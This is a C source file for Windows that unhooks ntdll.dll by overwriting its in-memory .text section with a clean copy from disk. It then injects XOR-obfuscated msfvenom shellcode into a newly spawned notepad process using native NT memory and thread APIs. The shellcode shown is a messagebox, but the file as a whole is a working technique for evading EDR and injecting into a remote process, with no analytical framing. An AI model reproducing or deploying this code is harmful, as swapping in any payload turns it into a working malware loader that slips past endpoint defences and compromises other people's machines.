#include <Windows.h>
#include <stdio.h>
#include <TlHelp32.h>

/*
 * Replace the TEXT section of the loaded ntdll
 * with the TEXT section of the ntdll on disk
*/

#define NTD_PATH "C:\\Windows\\System32\\ntdll.dll"

#define warn(x) printf("%s : 0x%08X\n", x, GetLastError()); 
#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)

DWORD create_notepad(void);
BOOL unhook_ntdll(HMODULE ntdll_init, LPVOID ntdll_view);

typedef struct _UNICODE_STRING
{
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES
{
    ULONG           Length;
    HANDLE          RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG           Attributes;
    PVOID           SecurityDescriptor;
    PVOID           SecurityQualityOfService;
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

typedef struct _PS_ATTRIBUTE
{
    ULONG Attribute;
    SIZE_T Size;
    union
    {
        ULONG Value;
        PVOID ValuePtr;
    } u1;
    PSIZE_T ReturnLength;
} PS_ATTRIBUTE, *PPS_ATTRIBUTE;

typedef struct _PS_ATTRIBUTE_LIST
{
    SIZE_T       TotalLength;
    PS_ATTRIBUTE Attributes[1];
} PS_ATTRIBUTE_LIST, *PPS_ATTRIBUTE_LIST;

typedef NTSTATUS(NTAPI *NAVM)(HANDLE, PVOID, ULONG, PULONG, ULONG, ULONG);
typedef NTSTATUS(NTAPI *NWVM)(HANDLE, PVOID, PVOID, ULONG, PULONG);
typedef NTSTATUS(NTAPI *NCT)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PPS_ATTRIBUTE_LIST);
typedef NTSTATUS(NTAPI *NPVM)(
    IN  HANDLE ProcessHandle,
    IN OUT PVOID *BaseAddress,
    IN OUT PULONG RegionSize,
    IN  ULONG NewProtect,
    OUT PULONG OldProtect
);


int main(void)
{
    HANDLE      ntdll = INVALID_HANDLE_VALUE, ntdll_mapping = NULL;
    LPVOID      ntdll_view = NULL;
    HMODULE     ntdll_init = NULL;
    PVOID       base = NULL;
    DWORD       notepad_pid, written;
    HANDLE      process, thread;
    SIZE_T      bufsz;
    NTSTATUS    status;
    ULONG       old;

    // msfvenom --platform windows -p windows/x64/messagebox TEXT="shellcode execution" EXITFUNC=thread -f c
    unsigned char buf[327] =
        "\xaf\x1b\xd2\xb7\xa3\xac\xac\xac\xbb\x83\x53\x53\x53\x12\x02\x12\x03\x01\x02\x05\x1b\x62"
        "\x81\x36\x1b\xd8\x01\x33\x6d\x1b\xd8\x01\x4b\x6d\x1b\xd8\x01\x73\x6d\x1b\xd8\x21\x03\x6d"
        "\x1b\x5c\xe4\x19\x19\x1e\x62\x9a\x1b\x62\x93\xff\x6f\x32\x2f\x51\x7f\x73\x12\x92\x9a\x5e"
        "\x12\x52\x92\xb1\xbe\x01\x12\x02\x6d\x1b\xd8\x01\x73\x6d\xd8\x11\x6f\x1b\x52\x83\x6d\xd8"
        "\xd3\xdb\x53\x53\x53\x1b\xd6\x93\x27\x3c\x1b\x52\x83\x03\x6d\xd8\x1b\x4b\x6d\x17\xd8\x13"
        "\x73\x1a\x52\x83\xb0\x0f\x1b\xac\x9a\x6d\x12\xd8\x67\xdb\x1b\x52\x85\x1e\x62\x9a\x1b\x62"
        "\x93\xff\x12\x92\x9a\x5e\x12\x52\x92\x6b\xb3\x26\xa2\x6d\x1f\x50\x1f\x77\x5b\x16\x6a\x82"
        "\x26\x85\x0b\x6d\x17\xd8\x13\x77\x1a\x52\x83\x35\x6d\x12\xd8\x5f\x1b\x6d\x17\xd8\x13\x4f"
        "\x1a\x52\x83\x6d\x12\xd8\x57\xdb\x1b\x52\x83\x12\x0b\x12\x0b\x0d\x0a\x09\x12\x0b\x12\x0a"
        "\x12\x09\x1b\xd0\xbf\x73\x12\x01\xac\xb3\x0b\x12\x0a\x09\x6d\x1b\xd8\x41\xba\x1a\xac\xac"
        "\xac\x0e\x1a\x94\x92\x53\x53\x53\x53\x6d\x1b\xde\xc6\x49\x52\x53\x53\x6d\x1f\xde\xd6\x7d"
        "\x52\x53\x53\x1b\x62\x9a\x12\xe9\x16\xd0\x05\x54\xac\x86\xe8\xb3\x4e\x79\x59\x12\xe9\xf5"
        "\xc6\xee\xce\xac\x86\x1b\xd0\x97\x7b\x6f\x55\x2f\x59\xd3\xa8\xb3\x26\x56\xe8\x14\x40\x21"
        "\x3c\x39\x53\x0a\x12\xda\x89\xac\x86\x20\x3b\x36\x3f\x3f\x30\x3c\x37\x36\x73\x36\x2b\x36"
        "\x30\x26\x27\x3a\x3c\x3d\x53\x1e\x36\x20\x20\x32\x34\x36\x11\x3c\x2b\x53";

    for (int i = 0; i < 327; i++)
        buf[i] = buf[i] ^ 0x53;

    ntdll = CreateFileA(NTD_PATH, FILE_READ_DATA, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (ntdll == INVALID_HANDLE_VALUE) {
        warn("CreateFileA fail");
        return 0;
    }

    // when we map it as an image, the dll is actually loaded for us
    ntdll_mapping = CreateFileMappingA(ntdll, NULL, PAGE_READONLY | SEC_IMAGE_NO_EXECUTE, 0, 0, NULL);
    if (!ntdll_mapping) {
        warn("CreateFileMappingA fail");
        CloseHandle(ntdll);
        return 0;
    }

    ntdll_view = MapViewOfFile(ntdll_mapping, FILE_MAP_READ, 0, 0, 0);
    if (!ntdll_view) {
        warn("MapViewOfFile fail");
        CloseHandle(ntdll);
        CloseHandle(ntdll_mapping);
        return 0;
    }

    ntdll_init = GetModuleHandleA("ntdll.dll");
    if (!ntdll_init) {
        warn("GetModuleHandleA fail");
        CloseHandle(ntdll);
        CloseHandle(ntdll_mapping);
        UnmapViewOfFile(ntdll_view);
        return 0;
    }

    if (!unhook_ntdll(ntdll_init, ntdll_view)) {
        CloseHandle(ntdll);
        CloseHandle(ntdll_mapping);
        UnmapViewOfFile(ntdll_view);
        return 0;
    }

    puts("Unhooked!");
    notepad_pid = create_notepad();
    if (!notepad_pid) {
        CloseHandle(ntdll);
        CloseHandle(ntdll_mapping);
        UnmapViewOfFile(ntdll_view);
        return 0;
    }

    printf("[+] Notepad pid: %d\n", notepad_pid);

    process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, notepad_pid);
    if (!process) {
        warn("OpenProcess fail");
        CloseHandle(ntdll);
        CloseHandle(ntdll_mapping);
        UnmapViewOfFile(ntdll_view);
        return 0;
    }

    NAVM NtAllocateVirtualMemory = (NAVM)GetProcAddress(ntdll_init, "NtAllocateVirtualMemory");
    NWVM NtWriteVirtualMemory = (NWVM)GetProcAddress(ntdll_init, "NtWriteVirtualMemory");
    NCT NtCreateThreadEx = (NCT)GetProcAddress(ntdll_init, "NtCreateThreadEx");
    NPVM NtProtectVirtualMemory = (NPVM)GetProcAddress(ntdll_init, "NtProtectVirtualMemory");

    bufsz = sizeof(buf);

    status = NtAllocateVirtualMemory(process, &base, 0, &bufsz, MEM_COMMIT, PAGE_READWRITE);
    if (!NT_SUCCESS(status)) {
        warn("NtAllocateVirtualMemory fail");
        CloseHandle(process);
        CloseHandle(ntdll);
        CloseHandle(ntdll_mapping);
        UnmapViewOfFile(ntdll_view);
        return 0;
    }
    
    bufsz = sizeof(buf);

    status = NtWriteVirtualMemory(process, base, buf, bufsz, NULL);
    if (!NT_SUCCESS(status)) {
        warn("NtWriteVirtualMemory fail");
        CloseHandle(process);
        CloseHandle(ntdll);
        CloseHandle(ntdll_mapping);
        UnmapViewOfFile(ntdll_view);
        return 0;
    }

    status = NtProtectVirtualMemory(process, &base, &bufsz, PAGE_EXECUTE_READ, &old);
    if (!NT_SUCCESS(status)) {
        warn("NtProtectVirtualMemory fail");
        CloseHandle(process);
        CloseHandle(ntdll);
        CloseHandle(ntdll_mapping);
        UnmapViewOfFile(ntdll_view);
        return 0;
    }

    status = NtCreateThreadEx(&thread, GENERIC_EXECUTE, NULL, process, (LPTHREAD_START_ROUTINE)base, NULL, FALSE, NULL, NULL, NULL, NULL);
    if (thread) {
        WaitForSingleObject(thread, 500);
        CloseHandle(thread);
    }

    CloseHandle(process);
    CloseHandle(ntdll);
    CloseHandle(ntdll_mapping);
    UnmapViewOfFile(ntdll_view);
    return 0;
}

DWORD create_notepad(void)
{
    char                    cmdl[] = "C:\\Windows\\System32\\notepad.exe";
    STARTUPINFOA            si = { 0 };
    PROCESS_INFORMATION     pi = { 0 };
    BOOL                    res;

    si.cb = sizeof(STARTUPINFOA);

    res = CreateProcessA(
        cmdl, NULL, NULL, NULL, FALSE,
        CREATE_NEW_CONSOLE, NULL, NULL,
        &si, &pi
    );

    if (!res) {
        puts("[-] Create notepad fail.");
        return 0;
    }

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    Sleep(2000);

    return pi.dwProcessId;
}

BOOL unhook_ntdll(HMODULE ntdll_init, LPVOID ntdll_view)
{
    LPVOID                  ntdll_init_addr = (LPVOID)ntdll_init;
    PIMAGE_DOS_HEADER       dos_header = (PIMAGE_DOS_HEADER)ntdll_init_addr;
    PIMAGE_NT_HEADERS       nt_header = (PIMAGE_NT_HEADERS)((DWORD_PTR)ntdll_init_addr + dos_header->e_lfanew);
    PIMAGE_SECTION_HEADER   section_header;
    DWORD                   old_protect;
    BOOL                    status;

    for (int i = 0; i < nt_header->FileHeader.NumberOfSections; i++) {
        section_header = (PIMAGE_SECTION_HEADER)((ULONG_PTR)(IMAGE_FIRST_SECTION(nt_header)) + ((ULONG_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));
        if (strcmp((char *)section_header->Name, ".text"))
            continue;

        // found .text section
        status = (BOOL)VirtualProtect((ULONG_PTR)ntdll_init_addr + (ULONG_PTR)(section_header->VirtualAddress),
            section_header->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &old_protect);
        if (!status) {
            warn("VirtualProtect fail");
            return status;
        }

        memcpy((ULONG_PTR)ntdll_init_addr + (ULONG_PTR)(section_header->VirtualAddress),
            (ULONG_PTR)ntdll_view + (ULONG_PTR)section_header->VirtualAddress, section_header->Misc.VirtualSize);

        status = (BOOL)VirtualProtect((ULONG_PTR)ntdll_init_addr + (ULONG_PTR)(section_header->VirtualAddress),
            section_header->Misc.VirtualSize, old_protect, &old_protect);
        if (!status) {
            warn("VirtualProtect fail");
            return status;
        }

        return TRUE;
    }

    // .text section not found 0.0
    return FALSE;
}